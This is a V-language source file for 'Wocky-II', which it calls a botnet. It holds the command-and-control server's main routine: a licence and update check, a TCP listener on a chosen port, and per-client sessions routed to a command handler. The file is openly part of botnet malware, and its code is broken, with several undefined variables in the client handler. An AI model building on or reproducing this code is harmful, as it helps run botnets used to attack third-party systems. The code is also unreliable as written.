/*

@title: Wocky-II
@since: 7/21/21
@creator: vZy

*/
import server
import auth
import wocky_cp
import wocky_uix
import wocky_utils
import config
import banner_sys
import utils
import os
import io
import net
import net.http
import time
#include "@VROOT/c_headers/test.c"
// #include <unistd.h>
// fn read(int, string, int) int
fn C.check()
// fn C.fdopen(int, string)

struct Current {}

fn main() {
	C.check()
	time.sleep(5)
	println(config.Clear)
	mut port := wocky_cp.port_check(os.args)
	wocky_cp.conn_check() or {
		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
	}
	wocky_cp.check_update()
	wocky_cp.licence_valiation()
	go listener(port)
	println('[+] NET Started on Port: $port')
	wocky_cp.command_handler()
}

fn listener(port string) {
	mut server := net.listen_tcp(.ip6, ':${port}') or {
		panic("[x] Error, Unable to start server!\r\n")
	}
	for {
		mut socket := server.accept() or {
			panic("[x] Error, Unable to accept the connection!\r\n")
		}
		go handle_client(mut socket)
	}
}


fn handle_client(mut socket net.TcpConn) {
	for {
		// u.set_title(mut socket, "${c_s.get_settings()[1]} | User: $username")
		mut data := reader.read_line() or { "" }
		data = data.replace("\r\n", "")
		if data.len == 0 {
			empty_c += 1
			if empty_c > 10 {
				println('User disconnected ${socket.peer_addr()}')
				socket.close() or { lol() }
				break
			}
			// println('${empty_c} fell in here')
		}
		server.cmd_handler(mut socket, data, username) // Main Command Handler
	}
	reader.free()
}

fn lol() {

}